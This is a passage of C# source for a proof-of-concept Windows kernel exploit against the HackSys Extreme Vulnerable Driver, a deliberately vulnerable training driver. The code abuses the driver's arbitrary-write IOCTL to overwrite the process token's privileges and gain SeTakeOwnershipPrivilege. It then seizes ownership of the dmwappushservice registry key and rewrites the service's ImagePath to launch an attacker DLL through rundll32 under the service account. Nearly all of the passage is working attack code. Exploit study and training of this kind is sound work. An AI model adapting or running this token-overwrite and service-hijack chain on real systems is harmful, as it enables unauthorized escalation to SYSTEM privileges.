                cbDacl = Marshal.SizeOf(typeof(ACL)) +
                    Marshal.SizeOf(typeof(ACCESS_ALLOWED_ACE)) -
                    Marshal.SizeOf(typeof(int)) +
                    cbSid;
                pDacl = Marshal.AllocHGlobal(cbDacl);
                status = InitializeAcl(pDacl, cbDacl, ACL_REVISION);

                if (!status)
                    break;

                status = AddAccessAllowedAce(
                    pDacl,
                    ACL_REVISION,
                    ACCESS_MASK.GENERIC_WRITE,
                    pSid);
            } while (false);

            if (!status)
            {
                if (pDacl != IntPtr.Zero)
                    Marshal.FreeHGlobal(pDacl);

                return IntPtr.Zero;
            }

            return pDacl;
        }


        static IntPtr GetOwnerInformation(string path, SE_OBJECT_TYPE objectType)
        {
            int error;

            error = GetNamedSecurityInfo(
                path,
                objectType,
                SECURITY_INFORMATION.OWNER_SECURITY_INFORMATION,
                out IntPtr pSidOwner,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero);

            if (error != ERROR_SUCCESS)
            {
                Console.WriteLine("[-] Failed to get owner information.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return IntPtr.Zero;
            }

            return pSidOwner;
        }


        static IntPtr GetCurrentProcessTokenPointer()
        {
            int error;
            int ntstatus;
            var pObject = IntPtr.Zero;

            if (!OpenProcessToken(
                Process.GetCurrentProcess().Handle,
                TokenAccessFlags.MAXIMUM_ALLOWED,
                out IntPtr hToken))
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to open current process token.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return IntPtr.Zero;
            }

            Console.WriteLine("[+] Got a handle of current process token.");
            Console.WriteLine("    |-> hToken: 0x{0}", hToken.ToString("X"));
            Console.WriteLine("[>] Trying to retrieve system information.");

            int systemInformationLength = 1024;
            IntPtr infoBuffer;

            do
            {
                infoBuffer = Marshal.AllocHGlobal(systemInformationLength);
                ZeroMemory(infoBuffer, systemInformationLength);

                ntstatus = NtQuerySystemInformation(
                    SYSTEM_INFORMATION_CLASS.SystemExtendedHandleInformation,
                    infoBuffer,
                    systemInformationLength,
                    ref systemInformationLength);

                if (ntstatus != STATUS_SUCCESS)
                    Marshal.FreeHGlobal(infoBuffer);
            } while (ntstatus == STATUS_INFO_LENGTH_MISMATCH);

            CloseHandle(hToken);

            if (ntstatus != STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to get system information.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(ntstatus, true));

                return IntPtr.Zero;
            }

            var entryCount = Marshal.ReadInt32(infoBuffer);
            Console.WriteLine("[+] Got {0} entries.", entryCount);

            var pid = Process.GetCurrentProcess().Id;
            var entry = new SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX();
            var entrySize = Marshal.SizeOf(entry);
            var pEntryOffset = new IntPtr(infoBuffer.ToInt64() + IntPtr.Size * 2);
            IntPtr uniqueProcessId;
            IntPtr handleValue;

            Console.WriteLine("[>] Searching our process entry (PID = {0}).", pid);

            for (var idx = 0; idx < entryCount; idx++)
            {
                entry = (SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)Marshal.PtrToStructure(
                    pEntryOffset,
                    entry.GetType());
                uniqueProcessId = entry.UniqueProcessId;
                handleValue = entry.HandleValue;

                if (uniqueProcessId == new IntPtr(pid) && handleValue == hToken)
                {
                    pObject = entry.Object;
                    Console.WriteLine("[+] Got our entry.");
                    Console.WriteLine("    |-> Object: 0x{0}", pObject.ToString("X16"));
                    Console.WriteLine("    |-> UniqueProcessId: {0}", uniqueProcessId);
                    Console.WriteLine("    |-> HandleValue: 0x{0}", handleValue.ToString("X"));

                    break;
                }

                pEntryOffset = new IntPtr(pEntryOffset.ToInt64() + entrySize);
            }

            if (pObject == IntPtr.Zero)
                Console.WriteLine("[-] Failed to get target entry.\n");

            Marshal.FreeHGlobal(infoBuffer);
            CloseHandle(hToken);

            return pObject;
        }


        static IntPtr GetDeviceHandle(string deviceName)
        {
            int error;

            Console.WriteLine("[>] Trying to open device driver.");
            Console.WriteLine("    |-> Device Path : {0}", deviceName);

            IntPtr hDevice = CreateFile(
                deviceName,
                FileAccess.ReadWrite,
                FileShare.ReadWrite,
                IntPtr.Zero,
                FileMode.Open,
                FileAttributes.Normal,
                IntPtr.Zero);

            if (hDevice == INVALID_HANDLE_VALUE)
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to get device handle.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return IntPtr.Zero;
            }

            Console.WriteLine("[+] Got a device handle.");
            Console.WriteLine("    |-> hDevice: 0x{0}", hDevice.ToString("X"));

            return hDevice;
        }


        static string GetWin32ErrorMessage(int code, bool isNtStatus)
        {
            int nReturnedLength;
            ProcessModuleCollection modules;
            FormatMessageFlags dwFlags;
            int nSizeMesssage = 256;
            var message = new StringBuilder(nSizeMesssage);
            IntPtr pNtdll = IntPtr.Zero;

            if (isNtStatus)
            {
                modules = Process.GetCurrentProcess().Modules;

                foreach (ProcessModule mod in modules)
                {
                    if (string.Compare(
                        Path.GetFileName(mod.FileName),
                        "ntdll.dll",
                        StringComparison.OrdinalIgnoreCase) == 0)
                    {
                        pNtdll = mod.BaseAddress;
                        break;
                    }
                }

                dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_HMODULE |
                    FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
            }
            else
            {
                dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
            }

            nReturnedLength = FormatMessage(
                dwFlags,
                pNtdll,
                code,
                0,
                message,
                nSizeMesssage,
                IntPtr.Zero);

            if (nReturnedLength == 0)
            {
                return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
            }
            else
            {
                return string.Format(
                    "[ERROR] Code 0x{0} : {1}",
                    code.ToString("X8"),
                    message.ToString().Trim());
            }
        }


        static void OverwriteTokenPrivileges(
            IntPtr hDevice,
            IntPtr tokenPointer,
            ulong privValue)
        {
            IntPtr pParent = new IntPtr(tokenPointer.ToInt64() + 0x40);
            IntPtr pEnabled = new IntPtr(tokenPointer.ToInt64() + 0x48);

            Console.WriteLine("[>] Trying to overwrite token.");

            WritePointer(hDevice, pParent, new IntPtr((long)privValue));
            WritePointer(hDevice, pEnabled, new IntPtr((long)privValue));
        }


        static bool ReadRegKeyValue(
            UIntPtr hKey,
            string subKey,
            string value,
            out IntPtr resultBuffer,
            out REG_TYPE type)
        {
            int error;
            int ntstatus;
            int lpcbData = 4;
            resultBuffer = Marshal.AllocHGlobal(lpcbData);
            type = REG_TYPE.REG_NONE;

            ntstatus = RegCreateKeyEx(
                hKey,
                subKey,
                IntPtr.Zero,
                IntPtr.Zero,
                0,
                KEY_QUERY_VALUE,
                IntPtr.Zero,
                out IntPtr phkResult,
                IntPtr.Zero);

            if (ntstatus != STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to get registry handle.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(ntstatus, true));
                Marshal.FreeHGlobal(resultBuffer);
                resultBuffer = IntPtr.Zero;

                return false;
            }

            do
            {
                error = RegQueryValueEx(
                    phkResult,
                    value,
                    0,
                    out type,
                    resultBuffer,
                    ref lpcbData);

                if (error != ERROR_SUCCESS)
                {
                    Marshal.FreeHGlobal(resultBuffer);
                    resultBuffer = Marshal.AllocHGlobal(lpcbData);
                }
            } while (error == ERROR_MORE_DATA);

            CloseHandle(phkResult);

            if (error != ERROR_SUCCESS)
            {
                Console.WriteLine("[-] Failed to read registry value.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
                resultBuffer = IntPtr.Zero;
                type = REG_TYPE.REG_NONE;

                return false;
            }
            else
            {
                return true;
            }
        }


        static bool StartHijackedService(string serviceName)
        {
            int error;

            Console.WriteLine("[>] Trying to start {0} service.", serviceName);

            var hSCManager = OpenSCManager(null, null, SC_MANAGER_CONNECT);

            if (hSCManager == IntPtr.Zero)
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to open service manager.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return false;
            }

            var hService = OpenService(
                hSCManager,
                serviceName,
                SERVICE_START);

            if (hService == IntPtr.Zero)
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to open service.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
                CloseServiceHandle(hSCManager);

                return false;
            }

            var status = StartService(
                hService,
                0,
                IntPtr.Zero);
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCManager);
            error = Marshal.GetLastWin32Error();

            if (!status && error != ERROR_SERVICE_REQUEST_TIMEOUT)
            {
                Console.WriteLine("[-] Failed to start service.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return false;
            }

            return true;
        }


        static void WritePointer(IntPtr hDevice, IntPtr where, IntPtr what)
        {
            uint ioctl = 0x22200B;
            IntPtr inputBuffer = Marshal.AllocHGlobal(IntPtr.Size * 2);
            IntPtr whatBuffer = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.Copy(BitConverter.GetBytes(what.ToInt64()), 0, whatBuffer, IntPtr.Size);
            IntPtr[] inputArray = new IntPtr[2];
            inputArray[0] = whatBuffer; // what
            inputArray[1] = where; // where
            Marshal.Copy(inputArray, 0, inputBuffer, 2);

            DeviceIoControl(hDevice, ioctl, inputBuffer, (IntPtr.Size * 2),
                IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero);

            Marshal.FreeHGlobal(whatBuffer);
            Marshal.FreeHGlobal(inputBuffer);
        }


        static bool OverwriteRegKeyValue(
            UIntPtr hKey,
            string subKey,
            string value,
            REG_TYPE type,
            IntPtr data,
            int cbData)
        {
            int ntstatus;

            ntstatus = RegCreateKeyEx(
                hKey,
                subKey,
                IntPtr.Zero,
                IntPtr.Zero,
                REG_OPTION_NON_VOLATILE,
                KEY_SET_VALUE,
                IntPtr.Zero,
                out IntPtr phkResult,
                IntPtr.Zero);

            if (ntstatus != STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to get registry handle.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(ntstatus, true));

                return false;
            }

            ntstatus = RegSetValueEx(
                phkResult,
                value,
                0,
                type,
                data,
                cbData);

            CloseHandle(phkResult);

            if (ntstatus != STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to write data in registry.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(ntstatus, true));

                return false;
            }

            return true;
        }


        static bool SetDaclInformation(
            string path,
            SE_OBJECT_TYPE objectType,
            IntPtr pDacl)
        {
            int error;

            error = SetNamedSecurityInfo(
                path,
                objectType,
                SECURITY_INFORMATION.DACL_SECURITY_INFORMATION,
                IntPtr.Zero,
                IntPtr.Zero,
                pDacl,
                IntPtr.Zero);

            if (error != ERROR_SUCCESS)
            {
                Console.WriteLine("[-] Failed to set DACL information.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return false;
            }
            else
            {
                return true;
            }
        }


        static bool SetOwnerInformation(
            string path,
            SE_OBJECT_TYPE objectType,
            IntPtr pSidOwner)
        {
            int error;

            error = SetNamedSecurityInfo(
                path,
                objectType,
                SECURITY_INFORMATION.OWNER_SECURITY_INFORMATION,
                pSidOwner,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero);

            if (error != ERROR_SUCCESS)
            {
                Console.WriteLine("[-] Failed to set owner information.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return false;
            }
            else
            {
                return true;
            }
        }


        static void ZeroMemory(IntPtr buffer, int size)
        {
            var nullBytes = new byte[size];
            Marshal.Copy(nullBytes, 0, buffer, size);
        }


        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine(
                    "Usage : {0} <path\\to\\HijackShellLib.dll>",
                    AppDomain.CurrentDomain.FriendlyName);

                return;
            }

            bool status;
            string accountName = Environment.UserName;
            IntPtr pGenericWriteDacl;
            IntPtr pInitialOwnerSid;
            var objectType = SE_OBJECT_TYPE.SE_REGISTRY_KEY;
            string registryPath = @"MACHINE\SYSTEM\CurrentControlSet\Services\dmwappushservice";
            string serviceName = "dmwappushservice";
            string subKey = string.Format(
                "SYSTEM\\CurrentControlSet\\Services\\{0}",
                serviceName);
            string value = "ImagePath";
            string revert;
            var modify = string.Format(
                "C:\\Windows\\System32\\rundll32.exe {0} FakeEntry",
                Path.GetFullPath(args[0]));
            var dataBytes = Encoding.Unicode.GetBytes(modify);
            var sizeData = dataBytes.Length;
            var data = Marshal.AllocHGlobal(sizeData);
            ZeroMemory(data, sizeData);
            Marshal.Copy(dataBytes, 0, data, sizeData);

            Console.WriteLine("--[ HEVD Kernel Write PoC : SeTakeOwnershipPrivilege - Service Modification\n");

            if (!Environment.Is64BitOperatingSystem)
            {
                Console.WriteLine("[!] 32 bit OS is not supported.\n");
                return;
            }
            else if (IntPtr.Size != 8)
            {
                Console.WriteLine("[!] Should be built with 64 bit pointer.\n");
                return;
            }

            Console.WriteLine("[*] Current account is \"{0}\\{1}\"", Environment.UserDomainName, Environment.UserName);
            Console.WriteLine("[>] Trying to find token address for this process.");

            IntPtr pCurrentToken = GetCurrentProcessTokenPointer();

            if (pCurrentToken == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to find nt!_TOKEN.");
                return;
            }
            else
            {
                Console.WriteLine("[+] nt!_TOKEN for this process @ 0x{0}", pCurrentToken.ToString("X16"));
            }

            string deviceName = "\\\\.\\HacksysExtremeVulnerableDriver";

            IntPtr hDevice = GetDeviceHandle(deviceName);

            if (hDevice == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to open {0}", deviceName);
                return;
            }

            var privs = (ulong)SepTokenPrivilegesFlags.TAKE_OWNERSHIP;

            OverwriteTokenPrivileges(hDevice, pCurrentToken, privs);
            CloseHandle(hDevice);

            SERVICE_STATE state = CheckServiceState(serviceName);

            if (state != SERVICE_STATE.SERVICE_STOPPED)
            {
                Console.WriteLine("[-] {0} service have not been stopped yet. Try again a few minutes later.", serviceName);
                Console.WriteLine("    |-> Current State : {0}", state.ToString());
                Console.WriteLine("[*] If you want to try this exploit soon, stop {0} with administrative privilege.\n", serviceName);
                return;
            }

            Console.WriteLine("[>] Trying to get caller account name and SID.");

            if (!ConvertAccountNameToSid(
                ref accountName,
                out IntPtr pAccountSid,
                out SID_NAME_USE peUserUse))
            {
                return;
            }
            else
            {
                ConvertSidToStringSid(pAccountSid, out string accountSidString);
                Console.WriteLine("[+] Got current account name and SID.");
                Console.WriteLine("[*] Current Account Information:");
                Console.WriteLine("    |-> Name : {0}", accountName);
                Console.WriteLine("    |-> SID  : {0}", accountSidString);
                Console.WriteLine("    |-> Type : {0}", peUserUse);
            }

            Console.WriteLine("[>] Trying to get current owner information.");

            pInitialOwnerSid = GetOwnerInformation(registryPath, objectType);

            if (pInitialOwnerSid == IntPtr.Zero)
                return;

            DumpOwnerSidInformation(pInitialOwnerSid);

            Console.WriteLine("[>] Trying to change owner to \"{0}\".", accountName);

            if (!SetOwnerInformation(registryPath, objectType, pAccountSid))
                return;
            else
                Console.WriteLine("[+] Owner is changed successfully.");

            Console.WriteLine("[>] Trying to add GenericWrite DACL for the current user.");

            pGenericWriteDacl = GetGenericWriteDacl(pAccountSid);

            if (pGenericWriteDacl == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to generate GenericWrite DACL for the current user.");
                return;
            }

            if (!SetDaclInformation(registryPath, objectType, pGenericWriteDacl))
                Console.WriteLine("[-] Failed to add GenericWrite DACL.");
            else
                Console.WriteLine("[+] GenericWrite DACL is added successfully.");

            if (!ReadRegKeyValue(
                HKEY_LOCAL_MACHINE,
                subKey,
                value,
                out IntPtr resultBuffer,
                out REG_TYPE type))
            {
                return;
            }

            revert = Marshal.PtrToStringUni(resultBuffer);
            Marshal.FreeHGlobal(resultBuffer);

            Console.WriteLine("[>] Trying to modify ImagePath of {0} service.", serviceName);
            Console.WriteLine("    |-> Initial ImagePath   : {0}", revert);
            Console.WriteLine("    |-> ImagePath to Modify : {0}", modify);

            status = OverwriteRegKeyValue(
                HKEY_LOCAL_MACHINE,
                subKey,
                value,
                type,
                data,
                sizeData);
            Marshal.FreeHGlobal(data);

            if (!status)
                return;

            dataBytes = Encoding.Unicode.GetBytes(revert);
            sizeData = dataBytes.Length;
            data = Marshal.AllocHGlobal(sizeData);
            ZeroMemory(data, sizeData);
            Marshal.Copy(dataBytes, 0, data, sizeData);

            status = StartHijackedService(serviceName);

            if (status)
                Console.WriteLine("[+] Exploit may be successful.");
            else
                Console.WriteLine("[-] Exploit may be failed.");

            Console.WriteLine("[>] Reverting ImagePath for {0} service.", serviceName);

            status = OverwriteRegKeyValue(
                HKEY_LOCAL_MACHINE,
                subKey,
                value,
                type,
                data,
                sizeData);
            Marshal.FreeHGlobal(data);

            if (status)
                Console.WriteLine("[+] ImagePath is reverted successfully.");
            else
                Console.WriteLine("[-] Failed to revert ImagePath.");

            Console.WriteLine("[*] DONE.\n");
        }
    }
}
